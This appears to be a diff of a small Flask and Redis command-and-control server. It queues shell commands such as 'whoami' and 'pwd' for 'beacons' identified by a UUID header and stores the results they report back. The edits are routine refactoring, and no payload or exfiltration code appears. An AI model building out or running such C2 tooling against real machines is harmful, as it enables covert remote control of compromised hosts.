@@ -10,16 +10,12 @@
 from datetime import datetime
 from flask import *
 import json
-import redis
-import logging
+import redis  # Make sure to install and start the redis server
+# sudo systemctl start redis-server.service
 import string
 
 conn = redis.StrictRedis(host='localhost', port=6379, db=0)
-print('test')
-conn.mset({"test": "test1"})
 app = Flask(__name__)
-log = logging.getLogger('werkzeug')
-log.disabled = True
 
 
 @app.route("/")
@@ -31,9 +27,11 @@ def home():
         # If we receive special characters just drop it entirely
         pass
     else:
-        # Let's convert the command struct to a JSON object
+        # I want to add a way to add the date here...
+        # As well as last check in date
+        # Lets convert the command struct to a JSON object
         structure = {
-            "Command": "whoami",
+            "Command": "0",
             "LastInteraction": "0",
             "LastCheckIn": f"{datetime.today().strftime('%Y-%m-%d %H:%M:%S')}",
             "Result": "0"
@@ -54,37 +52,25 @@ def session():
             # If we receive special characters just drop it entirely
             pass
         else:
-            try:
-                command = conn.hget('UUID', uuid)  # Get the struct
-                command = command.decode()  # Decode it from bytes
-                command = json.loads(command)  # it's returned as string so convert it to dict
-                structure = json.dumps(command)  # Dump the dict to json
-                comm = json.loads(structure)  # Load it into a new var
-                Command = comm["Command"]  # Grab the command var from the object
-                LastInteraction = comm["LastInteraction"]
-                Res = comm["Result"]
-                # Set the command to 0
-                structure = {
-                    "Command": "0",
-                    "LastInteraction": f"{LastInteraction}",
-                    "LastCheckIn": f"{str(datetime.today().strftime('%Y-%m-%d %H:%M:%S'))}",
-                    "Result": f"{Res}"
-                }
-                structure = json.dumps(structure)  # Dump the json
-                # Write the message value to the beacon:UUID key
-                conn.hset('UUID', uuid, structure)
-                return Command
-            except:
-                structure = {
-                    "Command": "whoami",
-                    "LastInteraction": "0",
-                    "LastCheckIn": f"{datetime.today().strftime('%Y-%m-%d %H:%M:%S')}",
-                    "Result": "0"
-                }
-                structure = json.dumps(structure)  # Dump the json
-                # Write the message value to the beacon:UUID key
-                conn.hset('UUID', uuid, structure)
-                return ('')
+            command = conn.hget('UUID', uuid)  # Get the struct
+            command = command.decode()  # Decode it from bytes
+            command = json.loads(command)  # it's returned as string so convert it to dict
+            structure = json.dumps(command)  # Dump the dict to json
+            comm = json.loads(structure)  # Load it into a new var
+            Command = comm["Command"]  # Grab the command var from the object
+            LastInteraction = comm["LastInteraction"]
+            Res = comm["Result"]
+            # Set the command to 0
+            structure = {
+                "Command": "0",
+                "LastInteraction": f"{LastInteraction}",
+                "LastCheckIn": f"{datetime.today().strftime('%Y-%m-%d %H:%M:%S')}",
+                "Result": f"{Res}"
+            }
+            structure = json.dumps(structure)  # Dump the json
+            # Write the message value to the beacon:UUID key
+            conn.hset('UUID', uuid, structure)
+            return Command
 
 
 @app.route("/schema", methods=['GET'])
@@ -92,7 +78,8 @@ def schema():
     # This function handles beacons returning data
     # Grab the appsessionid value from the headers
     uuid = request.headers['APPSESSIONID']
-    result = request.headers['RES']
+    result = request.headers['Res']
+    print(request.headers)
     if set(uuid).difference(string.ascii_letters + string.digits):
         # We're not going to bother with input sanitization here
         # If we receive special characters just drop it entirely
@@ -100,7 +87,7 @@ def schema():
     else:
         # Let's convert the command struct to a JSON object
         structure = {
-            "Command": "whoami",
+            "Command": "pwd",
             "LastInteraction": "0",
             "LastCheckIn": f"{datetime.today().strftime('%Y-%m-%d %H:%M:%S')}",
             "Result": f"{result}"
@@ -112,7 +99,7 @@ def schema():
 
 
 def serve():
-    app.run()  # ssl_context='adhoc')
+    app.run(host="localhost", port=8000)  # ssl_context='adhoc')
 
 
 if __name__ == "__main__":
